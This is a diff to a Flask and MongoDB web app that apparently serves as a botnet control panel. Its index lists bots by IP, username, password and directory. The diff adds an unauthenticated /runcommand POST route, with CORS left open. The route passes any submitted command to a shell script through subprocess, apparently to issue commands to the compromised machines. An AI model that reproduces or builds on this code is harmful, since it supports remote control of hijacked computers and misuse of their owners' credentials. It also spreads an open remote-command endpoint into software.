@@ -3,9 +3,19 @@ from flask import *
 from pymongo import *
 from flask_cors import CORS
 from collections import Counter
+import subprocess
 
 app = Flask(__name__)
 CORS(app)
+
+def execute(cmd):
+    popen = subprocess.Popen(cmd, stdout=subprocess.PIPE, universal_newlines=True)
+    for stdout_line in iter(popen.stdout.readline, ""):
+        yield stdout_line 
+    popen.stdout.close()
+    return_code = popen.wait()
+    if return_code:
+        raise subprocess.CalledProcessError(return_code, cmd)
 
 
 @app.errorhandler(404)
@@ -17,6 +27,15 @@ def index():
     bots = getBots().get_json()
     heads = ["botId","ip","username","password","loaded","directoryName"]
     return render_template('index.html',bots=list(bots.values()),heads=heads)
+
+@app.route('/runcommand',methods=['POST'])
+def runcommand():
+    command = request.form["command"]
+    print("here")
+    for line in execute(['sh', 'command.sh', command]):
+        print("command.sh\t"+line.strip())
+    print("done")
+    return jsonify({'code' : 200})
 
 @app.route('/login')
 def loginPage():
